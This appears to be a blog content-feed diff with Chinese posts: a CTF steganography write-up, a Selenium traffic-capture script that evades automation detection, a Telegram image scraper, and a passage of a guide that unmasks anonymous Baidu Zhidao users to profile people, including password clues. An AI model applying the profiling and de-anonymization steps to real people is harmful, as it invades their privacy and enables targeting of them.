+<p>12.zip是个真实加密的压缩包，看名字应该是1.png得到的信息和2.zip得到的信息结合，经过测试压缩密码为M78AllHailUltra0，解压得到一个无后缀文件12</p>
+<p>010editor查看12文件二进制格式，具备IHDR和IEND，且文件头格式为PNG文件格式，将后缀改成.png，发现无法打开。继续查看，发现一开始的8950被改成了8059，修改回去之后得到png图片</p>
+<p><img src="/images/MDslJlbMsu_eKha41WrT8A.png"></p>
+<p>得到flag{Easy_Combine_for_Best_Hikari}</p>
+<h3 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h3><h4 id="0x03-cryptobmp"><a href="#0x03-cryptobmp" class="headerlink" title="0x03 cryptobmp"></a>0x03 cryptobmp</h4><p>一道隐写题，为啥会放在加密里面？</p>
+<p>打开result.bmp图片，可以在图片中央隐约看出存在内容信息</p>
+<p>上Stegsolve.jar看图片信息和各信道信息，没有结果</p>
+<p>色盲图一样的信息，感觉需要用颜色XOR把中间内容提取出来，打开010editor，将重复的信息提取出来，然后重复填充进后面的内容，保留最后一块和文件大小不变</p>
+<p><img src="/images/JgoJIbhRzZJmgFQ9RleA3g.png"></p>
+<p>用Stegsolve.jar异或叠加图片得到flag{c7FHe110n006}</p>
+<p><img src="/images/7AyLv1btjbin34I_aZEXYQ.png"></p>
+<h2 id="unsolved"><a href="#unsolved" class="headerlink" title="unsolved"></a>unsolved</h2><h4 id="0x04-IFDEMSKOIVB"><a href="#0x04-IFDEMSKOIVB" class="headerlink" title="0x04 IFDEMSKOIVB"></a>0x04 IFDEMSKOIVB</h4><p>标题和正文内容都经过加密或者编码</p>
+<p>看正文内容只包含数字{2-7}字母{A-Z}推测加密为base32，解密标题为</p>
+<p>AFFINECTF</p>
+<p>看上去是仿射加密，但是缺少仿射公式，正文内容也无法用base32解密，也不能用”flag{“去逆推，暂时卡住了</p>
+<p>将正文按照出现频次最高的7G分隔，得到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7GATL5FR7W2W7KQIF3CDLQVAYS</span><br><span class="line">7G7DCDSDVQ7D5LSG2QZXVY</span><br><span class="line">7G6TF5KJ7KGG56VKED</span><br></pre></td></tr></table></figure>
+
+<p>按照7和G对应RFC4648的值a&#x3D;31和b&#x3D;6进行仿射加密和解密，将仿射结果用base32解密，失败</p>
+<hr>
+<p>看了wp，说是爆破标题的<code>IFDEMSKOIVBVIRQ</code>和<code>7GATL5FR7W2W7KQ</code>得出仿射参数a和b</p>
+<p>黑人问号？？？你这最后一个Q一看就没仿射啊</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+        <category>Hacker</category>
+        <category>Security</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>NeSE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Selenium自动化网页流量生成的设计与实现</title>
+    <url>/2021/09/15/Selenium%E6%A8%A1%E6%8B%9F%E7%BD%91%E9%A1%B5%E4%BA%A4%E4%BA%92%E5%B9%B6%E7%94%9F%E6%88%90%E6%B5%81%E9%87%8F/</url>
+    <content><![CDATA[<h2 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h2><p>在网络流量分析研究中，构建真实的用户访问行为模型需要大量正常的网页交互流量。本系统通过Selenium自动化技术模拟真实用户行为，访问ChinaZ站长之家排名前500的网站，自动生成高质量的流量数据用于恶意流量分析研究。</p>
+<h2 id="系统架构"><a href="#系统架构" class="headerlink" title="系统架构"></a>系统架构</h2><h3 id="1-ChinaZ网站排名信息爬取模块"><a href="#1-ChinaZ网站排名信息爬取模块" class="headerlink" title="1. ChinaZ网站排名信息爬取模块"></a>1. ChinaZ网站排名信息爬取模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: wenbuer</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-13 14:45:30</span></span><br><span class="line"><span class="comment"># @Last Modified by:   W3n13uE2</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-13 15:53:46</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> requests.exceptions <span class="keyword">import</span> RequestException</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将爬取的代理设置成浏览器,针对一些反爬网站</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取一页的内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_one_page</span>(<span class="params">targetUrl</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(targetUrl, headers)</span><br><span class="line">        <span class="keyword">if</span> (response.status_code == <span class="number">200</span>):  <span class="comment"># 状态码 =200 ,说明爬取正常</span></span><br><span class="line">            parse_one_page(response.content.decode())</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">except</span> RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过正则表达式获取需要的数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_one_page</span>(<span class="params">target_text</span>):</span><br><span class="line">    pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;.*? target=&quot;_blank&quot; class=&quot;pr10 fz14&quot;&gt;(.*?)&lt;/a&gt;&#x27;</span>)</span><br><span class="line">    pattern2 = re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;col-gray&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>)</span><br><span class="line">    myList = pattern.findall(target_text)</span><br><span class="line">    myList2 = pattern2.findall(target_text)[<span class="number">1</span>:]</span><br><span class="line">    result.extend(myList)</span><br><span class="line">    result2.extend(myList2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爬取每一页内容</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crawl_each_url</span>():</span><br><span class="line">    get_one_page(<span class="string">&quot;https://top.chinaz.com/all/&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">51</span>):</span><br><span class="line">        get_one_page(<span class="string">f&quot;https://top.chinaz.com/all/index_<span class="subst">&#123;i&#125;</span>.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将数据保存到当前路径下的 &quot;中国网站排名.txt&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_to_file</span>(<span class="params">result_text,result_text2</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;chinaz.txt&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">            f.write(<span class="string">f&quot;<span class="subst">&#123;i+<span class="number">1</span>&#125;</span>,<span class="subst">&#123;result_text[i]&#125;</span>,<span class="subst">&#123;result_text2[i]&#125;</span>\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    result = []</span><br><span class="line">    result2 = []</span><br><span class="line">    crawl_each_url()</span><br><span class="line">    write_to_file(result,result2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-Selenium自动化流量生成模块"><a href="#2-Selenium自动化流量生成模块" class="headerlink" title="2. Selenium自动化流量生成模块"></a>2. Selenium自动化流量生成模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author: wenbuer</span></span><br><span class="line"><span class="comment"># @Date:   2021-09-13 10:55:12</span></span><br><span class="line"><span class="comment"># @Last Modified by:   W3n13uE2</span></span><br><span class="line"><span class="comment"># @Last Modified time: 2021-09-13 19:40:32</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> scapy.sendrecv <span class="keyword">import</span> sniff</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyThread</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, ids, url, timeout, browser</span>):</span><br><span class="line">        threading.Thread.__init__(<span class="variable language_">self</span>)</span><br><span class="line">        <span class="variable language_">self</span>.ids = ids  <span class="comment"># 线程ID，控制线程职责(捕获数据、自动化访问)</span></span><br><span class="line">        <span class="variable language_">self</span>.url = url  <span class="comment"># 需要访问的URL</span></span><br><span class="line">        <span class="variable language_">self</span>.timeout = timeout  <span class="comment"># 访问完成大概需要的时间</span></span><br><span class="line">        <span class="variable language_">self</span>.browser = browser  <span class="comment"># 浏览器</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="variable language_">self</span>.name)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.ids:</span><br><span class="line">            <span class="comment"># 控制浏览器访问</span></span><br><span class="line">            automated_access(<span class="variable language_">self</span>.url, <span class="variable language_">self</span>.browser, <span class="variable language_">self</span>.timeout)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 收集数据包</span></span><br><span class="line">            collect_pcap(<span class="variable language_">self</span>.timeout, <span class="variable language_">self</span>.url, <span class="variable language_">self</span>.browser)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">collect_pcap</span>(<span class="params">timeout, url, browser</span>):</span><br><span class="line">    data = sniff(timeout=timeout)  <span class="comment"># 可以加filter过滤</span></span><br><span class="line">    file_name = url.replace(<span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&#x27;</span>)  <span class="comment"># 保存的文件名</span></span><br><span class="line">    writer = PcapWriter(<span class="string">&quot;%s-%s.pcap&quot;</span> % (browser, file_name))</span><br><span class="line">    writer.write(data)</span><br><span class="line">    writer.flush()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">new_window</span>(<span class="params">driver, timeout</span>):</span><br><span class="line">    url_handle = driver.current_window_handle  <span class="comment"># 获取当前窗口句柄</span></span><br><span class="line">    <span class="keyword">for</span> link <span class="keyword">in</span> driver.find_elements_by_xpath(<span class="string">&#x27;//a&#x27;</span>):</span><br><span class="line">        a = link.get_attribute(<span class="string">&#x27;href&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&quot;javascript:;&quot;</span> <span class="keyword">or</span> a == driver.current_url:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        next_url = a</span><br><span class="line">        js = <span class="string">&#x27;window.open(&quot;%s&quot;)&#x27;</span>%next_url</span><br><span class="line">        driver.execute_script(js)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    time.sleep(timeout)  <span class="comment"># 线程休眠，保证浏览器充分访问完之后再关闭浏览器</span></span><br><span class="line">    driver.close()  <span class="comment"># 关闭对应窗口</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">automated_access</span>(<span class="params">url, browser, timeout</span>):</span><br><span class="line">    <span class="keyword">if</span> browser == <span class="string">&#x27;Chrome&#x27;</span>:</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        options.add_experimental_option(<span class="string">&#x27;excludeSwitches&#x27;</span>, [<span class="string">&#x27;enable-automation&#x27;</span>])</span><br><span class="line">        options.add_experimental_option(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>) <span class="comment"># 屏蔽网站对Selenium的检测</span></span><br><span class="line">        driver = webdriver.Chrome(options=options)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">&quot;http://&quot;</span>+url</span><br><span class="line">            driver.get(url)  <span class="comment"># 访问URL</span></span><br><span class="line">            time.sleep(timeout)  <span class="comment"># 线程休眠，保证浏览器充分访问完之后再关闭浏览器</span></span><br><span class="line">            new_window(driver,new_window_timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e.args)</span><br><span class="line">        driver.quit()  <span class="comment"># 退出浏览器</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        options = webdriver.FirefoxOptions()</span><br><span class="line">        profile = webdriver.FirefoxProfile()</span><br><span class="line">        profile.set_preference(<span class="string">&quot;dom.webdriver.enabled&quot;</span>, <span class="literal">False</span>)  <span class="comment"># 设置非driver驱动</span></span><br><span class="line">        profile.set_preference(<span class="string">&#x27;useAutomationExtension&#x27;</span>, <span class="literal">False</span>) <span class="comment">#关闭自动化提示</span></span><br><span class="line">        profile.update_preferences()    <span class="comment">#更新设置</span></span><br><span class="line">        driver = webdriver.Firefox(firefox_options=options ,firefox_profile=profile)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            url = <span class="string">&quot;http://&quot;</span>+url </span><br><span class="line">            driver.get(url)</span><br><span class="line">            time.sleep(timeout)</span><br><span class="line">            new_window(driver,new_window_timeout)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e.args)</span><br><span class="line">        driver.quit()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;finished.&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    webname,website = [],[]</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;chinaz.txt&quot;</span>,<span class="string">&quot;r&quot;</span>,encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        line = f.readline().rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">while</span> line:</span><br><span class="line">            webname.extend([line.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">1</span>]])</span><br><span class="line">            website.extend([line.split(<span class="string">&#x27;,&#x27;</span>)[<span class="number">2</span>]])</span><br><span class="line">            line = f.readline().rstrip(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    url_list = website  <span class="comment"># url列表</span></span><br><span class="line">    browser = [<span class="string">&#x27;Chrome&#x27;</span>, <span class="string">&#x27;Firefox&#x27;</span>]  <span class="comment"># 浏览器列表</span></span><br><span class="line">    timeout = <span class="number">5</span>  <span class="comment"># 浏览器访问网站的时间</span></span><br><span class="line">    new_window_timeout = <span class="number">10</span> <span class="comment"># 浏览下一个网站的时间</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> url_list:</span><br><span class="line">        <span class="keyword">for</span> bro <span class="keyword">in</span> browser:</span><br><span class="line">            thread1 = MyThread(<span class="number">0</span>, url, timeout, bro)</span><br><span class="line">            thread1.start()  <span class="comment"># 启动子线程</span></span><br><span class="line">            thread2 = MyThread(<span class="number">1</span>, url, timeout, bro)</span><br><span class="line">            thread2.start()</span><br><span class="line">            thread1.join()  <span class="comment"># 父线程等待子线程</span></span><br><span class="line">            thread2.join()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Exit the main thread &quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
+<li><strong>反检测机制</strong>：<ul>
+<li>Chrome使用<code>--disable-blink-features=AutomationControlled</code></li>
+<li>Firefox设置<code>dom.webdriver.enabled</code>为False</li>
+<li>移除自动化扩展标识</li>
+</ul>
+</li>
+<li><strong>高效流量捕捉</strong>：<ul>
+<li>Scapy库实现网络层流量捕获</li>
+<li>多线程并发处理提高效率</li>
+<li>智能命名保存pcap文件</li>
+</ul>
+</li>
+<li><strong>真实用户模拟</strong>：<ul>
+<li>随机选择页面链接进行二次访问</li>
+<li>合理的浏览时间间隔</li>
+<li>多种浏览器配置模拟不同用户设备</li>
+</ul>
+</li>
+</ol>
+<h2 id="系统优化方向"><a href="#系统优化方向" class="headerlink" title="系统优化方向"></a>系统优化方向</h2><ol>
+<li><strong>行为多样性增强</strong>：<ul>
+<li>添加鼠标移动轨迹模拟</li>
+<li>实现页面滚动行为</li>
+<li>随机点击非链接元素</li>
+</ul>
+</li>
+<li><strong>性能提升</strong>：<ul>
+<li>采用浏览器池减少初始化开销</li>
+<li>异步IO处理提高并发能力</li>
+<li>分布式部署方案</li>
+</ul>
+</li>
+<li><strong>数据分析集成</strong>：<ul>
+<li>实时流量特征提取</li>
+<li>访问行为模式分析</li>
+<li>异常检测告警机制</li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Traffic Analysis</category>
+      </categories>
+      <tags>
+        <tag>Study life</tag>
+        <tag>Traffic Analysis</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基于Telegram机器人的图片爬虫</title>
+    <url>/2021/12/20/%E7%88%AC%E8%99%AB%E8%8E%B7%E5%8F%96telegram%E5%8F%91%E5%9B%BE%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%9B%BE%E7%89%87%E5%86%85%E5%AE%B9/</url>
+    <content><![CDATA[<h2 id="项目概述"><a href="#项目概述" class="headerlink" title="项目概述"></a>项目概述</h2><p>本文将详细介绍如何通过Python爬虫技术，从Telegram的图片机器人获取图片内容，并将这些图片集成到QQ机器人中实现跨平台转发功能。</p>
+<h2 id="技术实现流程"><a href="#技术实现流程" class="headerlink" title="技术实现流程"></a>技术实现流程</h2><h3 id="1-获取Telegram图片链接"><a href="#1-获取Telegram图片链接" class="headerlink" title="1. 获取Telegram图片链接"></a>1. 获取Telegram图片链接</h3><p>首先通过Telegram客户端操作获取目标机器人的图片分享链接：</p>
+<ol>
+<li>选择需要爬取的机器人消息</li>
+<li>点击”转发”选项</li>
+<li>选择”复制链接”</li>
+</ol>
+<p><img src="/images/image-20211220103054655.png" alt="image-20211220103054655"></p>
+<p>典型链接格式为：<code>https://t.me/botmzt/XXXX?single</code>，其中<code>XXXX</code>为图片的唯一数字编号。</p>
+<h3 id="2-分析图片存放机制"><a href="#2-分析图片存放机制" class="headerlink" title="2. 分析图片存放机制"></a>2. 分析图片存放机制</h3><p>通过浏览器开发者工具分析图片加载过程：</p>
+<ol>
+<li>在浏览器中打开获得的链接</li>
+<li>按F12打开开发者工具</li>
+<li>切换到”网络(Network)”标签</li>
+<li>观察图片资源的实际请求地址</li>
+</ol>
+<p><img src="/images/image-20211220123312110.png" alt="image-20211220123312110"></p>
+<p>可以发现实际图片请求常带有<code>embed=1&amp;single=1</code>参数。</p>
+<h3 id="3-实现爬虫代码"><a href="#3-实现爬虫代码" class="headerlink" title="3. 实现爬虫代码"></a>3. 实现爬虫代码</h3><p>基于Python实现完整的爬虫功能：</p>
+<p>然后分析<a href="https://t.me/botmzt/XXXX?embed=1&single=1%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E6%89%BE%E5%88%B0%E5%9B%BE%E7%89%87%E5%AF%B9%E5%BA%94%E7%9A%84url%E3%80%82%E5%90%8C%E6%97%B6%E6%89%BE%E5%88%B0%E6%97%A0%E5%9B%BE%E7%89%87%E6%97%B6%E7%9A%84%E6%BA%90%E7%A0%81%EF%BC%8C%E4%BD%9C%E4%B8%BA%E4%B8%80%E4%B8%AA%E5%88%A4%E5%88%AB%E6%9D%A1%E4%BB%B6">https://t.me/botmzt/XXXX?embed=1&amp;single=1的源码，找到图片对应的url。同时找到无图片时的源码，作为一个判别条件</a></p>
+<p>通过之前文章的代理内容，我们可以写爬虫代码直接下载图片内容</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment"># 配置部分</span></span><br><span class="line">prefix_url = <span class="string">&quot;https://t.me/botmzt/&quot;</span></span><br><span class="line">suffix_url = <span class="string">&quot;?embed=1&amp;single=1&quot;</span></span><br><span class="line">file_url = <span class="string">&quot;./picCache/&quot;</span></span><br><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">&#x27;http&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;https&#x27;</span>: <span class="string">&#x27;socks5://127.0.0.1:1080&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;close&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TelegramImageCrawler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.session = requests.Session()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_latest_image_num</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;获取最新的图片编号&quot;&quot;&quot;</span></span><br><span class="line">        <span class="comment"># 实现省略.</span></span><br><span class="line">        </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">download_image</span>(<span class="params">self, image_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;下载指定编号的图片&quot;&quot;&quot;</span></span><br><span class="line">        target_url = <span class="string">f&quot;<span class="subst">&#123;prefix_url&#125;</span><span class="subst">&#123;image_num&#125;</span><span class="subst">&#123;suffix_url&#125;</span>&quot;</span></span><br><span class="line">        response = <span class="variable language_">self</span>.session.get(target_url, proxies=proxies, headers=headers)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> response.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            </span><br><span class="line">        soup = BeautifulSoup(response.text, <span class="string">&#x27;lxml&#x27;</span>)</span><br><span class="line">        pic_data = soup.find_all(<span class="string">&#x27;a&#x27;</span>, attrs=&#123;<span class="string">&#x27;class&#x27;</span>: <span class="string">&#x27;js-message_photo&#x27;</span>&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> pic_data:</span><br><span class="line">            img_style = pic_data[<span class="number">0</span>][<span class="string">&#x27;style&#x27;</span>]</span><br><span class="line">            img_url = re.search(<span class="string">&#x27;https:.*?jpg&#x27;</span>, img_style).group()</span><br><span class="line">            </span><br><span class="line">            img_data = <span class="variable language_">self</span>.session.get(img_url, proxies=proxies, headers=headers).content</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">f&#x27;/data/images/<span class="subst">&#123;image_num&#125;</span>.jpg&#x27;</span>, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                f.write(img_data)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">batch_download</span>(<span class="params">self, start_num, end_num</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;批量下载图片&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(start_num, end_num+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;正在下载图片 #<span class="subst">&#123;num&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="variable language_">self</span>.download_image(num)</span><br></pre></td></tr></table></figure>
+
+<h2 id="关键技术点"><a href="#关键技术点" class="headerlink" title="关键技术点"></a>关键技术点</h2><ol>
+<li><strong>代理配置</strong>：使用SOCKS5代理访问Telegram</li>
+<li><strong>异常处理</strong>：检测<code>tgme_widget_message_error</code>类判断无效消息</li>
+<li><strong>图片识别</strong>：通过BeautifulSoup解析DOM结构获取图片URL</li>
+<li><strong>文件存储</strong>：将下载的图片按编号保存到本地</li>
+</ol>
+<h2 id="系统集成"><a href="#系统集成" class="headerlink" title="系统集成"></a>系统集成</h2><p>将爬虫功能集成到go-cqhttp机器人的基本思路：</p>
+<ol>
+<li>设置定时任务定期检查新图片</li>
+<li>下载新图片到本地存储</li>
+<li>通过QQ机器人接口发送图片</li>
+<li>记录已处理的图片编号防止重复</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Daily</category>
+      </categories>
+      <tags>
+        <tag>Daily life</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>社工案例思路——无交互日常篇</title>
+    <url>/2021/01/21/%E7%A4%BE%E5%B7%A5%E6%A1%88%E4%BE%8B%E6%80%9D%E8%B7%AF%E2%80%94%E2%80%94%E6%97%A0%E4%BA%A4%E4%BA%92%E6%97%A5%E5%B8%B8%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="社工案例思路-被动信息收集篇"><a href="#社工案例思路-被动信息收集篇" class="headerlink" title="社工案例思路-被动信息收集篇"></a>社工案例思路-被动信息收集篇</h1><h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>“互联网时代没有隐私”已经成为普遍认知。本文将分享基于社会工程学的被动信息收集方法，在不与目标产生直接交互的情况下，如何通过常见应用平台构建详细的人物画像。所有技术手法均属于被动分析范畴，避免采用钓鱼邮件等主动攻击手段。</p>
+<h2 id="0x01-人物画像"><a href="#0x01-人物画像" class="headerlink" title="0x01 人物画像"></a>0x01 人物画像</h2><p>人物画像可以从简单到复杂分为多个层次：</p>
+<p><strong>基础信息层</strong>：</p>
+<ul>
+<li>用户名&#x2F;昵称</li>
+<li>真实姓名</li>
+<li>地理位置</li>
+<li>联系方式</li>
+</ul>
+<p><strong>社交网络层</strong>：</p>
+<ul>
+<li>各平台账号关联</li>
+<li>社交关系图谱</li>
+<li>活跃社区分布</li>
+</ul>
+<p><strong>深度信息层</strong>：</p>
+<ul>
+<li>教育&#x2F;职业背景</li>
+<li>行为习惯模式</li>
+<li>潜在密码线索</li>
+</ul>
+<h2 id="0x02-实战案例1：百度知道的匿名破解"><a href="#0x02-实战案例1：百度知道的匿名破解" class="headerlink" title="0x02 实战案例1：百度知道的匿名破解"></a>0x02 实战案例1：百度知道的匿名破解</h2><h3 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>已知目标的QQ号，希望通过百度平台获取更多信息。</p>
+<h3 id="技术路径"><a href="#技术路径" class="headerlink" title="技术路径"></a>技术路径</h3><ol>
+<li>使用Google Hacking搜索技巧定位目标QQ或邮箱关联的百度知道回答</li>
+<li>破解百度知道的”伪匿名”机制</li>
+<li>还原真实百度账号</li>
+<li>扩展分析其贴吧活动等数据</li>
+</ol>
+<h3 id="操作演示"><a href="#操作演示" class="headerlink" title="操作演示"></a>操作演示</h3><p>以其中的QQ邮箱为搜索内容，进行查询</p>
+<p><img src="/images/20210124193648.png" alt="image-20210124193648040"></p>
+<p>点击进入之后，目标显示回答内容为匿名用户</p>
+<p><img src="/images/20210124194952.png" alt="image-20210124194952597"></p>
+<p>关键突破点在于发现百度知道的匿名并非真正匿名。通过审查页面源码，可以找到隐藏的用户标识：</p>
+<p><img src="/images/20210124200404.png" alt="image-20210124200404409"></p>
+<p>得到该目标百度信息encodeUid、uid和uname，例如：</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">encodeUid</span>: <span class="string">&quot;xxx&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="attr">uid</span>: <span class="string">&quot;123456&quot;</span>,</span><br><span class="line"></span><br><span class="line"><span class="attr">uname</span>: <span class="string">&quot;\u7528\u6237\u540d&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>技术要点</strong>：</p>
+<ul>
+<li>使用<code>encodeUid</code>构造用户中心链接：<code>zhidao.baidu.com/usercenter?uid=[encodeUid]</code></li>
+<li>对<code>uname</code>进行Unicode解码后构造贴吧链接：<code>tieba.baidu.com/home/main?un=[decoded_uname]</code></li>
+</ul>
+<h2 id="0x03-实战案例2：网易云id参数构造"><a href="#0x03-实战案例2：网易云id参数构造" class="headerlink" title="0x03 实战案例2：网易云id参数构造"></a>0x03 实战案例2：网易云id参数构造</h2><h3 id="攻击场景-1"><a href="#攻击场景-1" class="headerlink" title="攻击场景"></a>攻击场景</h3><p>获取到目标分享的网易云音乐链接。</p>
